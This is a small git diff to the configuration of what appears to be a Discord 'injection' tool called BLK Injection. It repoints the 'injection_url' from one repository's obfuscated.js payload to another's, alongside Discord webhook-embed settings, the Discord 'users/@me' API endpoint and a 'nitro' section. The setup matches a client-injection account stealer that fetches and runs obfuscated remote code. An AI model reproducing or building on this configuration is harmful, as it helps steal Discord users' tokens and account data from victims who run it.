@@ -14,7 +14,7 @@ const config = {
   embed_name: 'BLK Injection', 
   embed_icon: 'https://raw.githubusercontent.com/GOD-BLK/BLK-injection/main/imgs/pfp.png', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/master/obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/GOD-BLK/BLK-injection/main/obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
